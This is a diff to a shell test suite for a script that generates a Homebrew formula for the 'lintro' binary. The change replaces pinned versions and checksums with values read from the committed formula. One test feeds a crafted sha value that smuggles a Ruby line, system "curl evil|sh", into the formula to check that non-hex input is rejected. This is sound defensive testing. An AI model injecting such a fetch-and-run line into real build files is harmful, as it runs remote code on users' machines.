@@ -15,35 +15,56 @@ teardown() {
 	teardown_temp_dir
 }
 
+# Derive the committed lintro binary version and per-arch shas so the tests
+# track releases instead of pinning literals that break on every version bump.
+committed_version() {
+	sed -nE 's/^[[:space:]]*version[[:space:]]+"([^"]+)".*/\1/p' \
+		"$REPO_ROOT/Formula/lintro.rb" | head -1
+}
+
+committed_sha() { # $1 = on_arm | on_intel
+	awk -v blk="$1" '
+		$0 ~ blk { f = 1 }
+		f && /sha256/ { gsub(/[",]/, "", $2); print $2; exit }
+	' "$REPO_ROOT/Formula/lintro.rb"
+}
+
+committed_assets() {
+	printf '{"arm64-sha":"%s","x86-sha":"%s"}' \
+		"$(committed_sha on_arm)" "$(committed_sha on_intel)"
+}
+
 @test "generate-binary-formula: lintro binary structure and SHAs" {
 	export SKIP_ASSET_VERIFY=1
 	output_file="$TEST_TEMP_DIR/lintro.rb"
-	binary_assets='{"arm64-sha":"d4f20eb9489a538355d0844d5f5485dbd6de3e9365f05a094a553f0932a7d135","x86-sha":"a5c0032cde090c490b41f754c357e54f34a95dcda26794ceb81660b1f5185b27"}'
+	version="$(committed_version)"
+	arm="$(committed_sha on_arm)"
+	x86="$(committed_sha on_intel)"
 
 	run bash "$SCRIPTS_DIR/generate-binary-formula.sh" \
 		--config "$REPO_ROOT/formulas/lintro.yml" \
 		--formula-key lintro \
-		--version 0.64.5 \
+		--version "$version" \
 		--output "$output_file" \
-		--binary-assets "$binary_assets"
+		--binary-assets "$(committed_assets)"
 
 	[ "$status" -eq 0 ]
 	grep -q '# typed: strict' "$output_file"
 	grep -q 'class Lintro < Formula' "$output_file"
-	grep -q 'version "0.64.5"' "$output_file"
-	grep -q 'd4f20eb9489a538355d0844d5f5485dbd6de3e9365f05a094a553f0932a7d135' "$output_file"
-	grep -q 'a5c0032cde090c490b41f754c357e54f34a95dcda26794ceb81660b1f5185b27' "$output_file"
+	grep -q "version \"${version}\"" "$output_file"
+	grep -q "$arm" "$output_file"
+	grep -q "$x86" "$output_file"
 	grep -q 'lintro-macos-arm64' "$output_file"
 }
 
 @test "generate-binary-formula: rejects non-hex sha" {
 	output_file="$TEST_TEMP_DIR/lintro.rb"
-	binary_assets='{"arm64-sha":"deadbeef\"\n    system \"curl evil|sh\"\n    sha256 \"x","x86-sha":"a5c0032cde090c490b41f754c357e54f34a95dcda26794ceb81660b1f5185b27"}'
+	binary_assets="{\"arm64-sha\":\"deadbeef\\\"\\n    system \\\"curl evil|sh\\\"\\n    sha256 \\\"x\",\"x86-sha\":\"$(committed_sha on_intel)\"}"
 
 	run bash "$SCRIPTS_DIR/generate-binary-formula.sh" \
 		--config "$REPO_ROOT/formulas/lintro.yml" \
 		--formula-key lintro \
-		--version 0.64.5 \
+		--version "$(committed_version)" \
 		--output "$output_file" \
 		--binary-assets "$binary_assets"
 
@@ -54,14 +75,15 @@ teardown() {
 @test "generate-binary-formula: parity with committed lintro.rb" {
 	export SKIP_ASSET_VERIFY=1
 	output_file="$TEST_TEMP_DIR/lintro.rb"
-	binary_assets='{"arm64-sha":"d4f20eb9489a538355d0844d5f5485dbd6de3e9365f05a094a553f0932a7d135","x86-sha":"a5c0032cde090c490b41f754c357e54f34a95dcda26794ceb81660b1f5185b27"}'
 
+	# Regenerate using the version and shas read straight from the committed
+	# formula, so this stays green across releases without fixture edits.
 	run bash "$SCRIPTS_DIR/generate-binary-formula.sh" \
 		--config "$REPO_ROOT/formulas/lintro.yml" \
 		--formula-key lintro \
-		--version 0.64.5 \
+		--version "$(committed_version)" \
 		--output "$output_file" \
-		--binary-assets "$binary_assets"
+		--binary-assets "$(committed_assets)"
 
 	[ "$status" -eq 0 ]
 	assert_files_equal "$REPO_ROOT/Formula/lintro.rb" "$output_file"
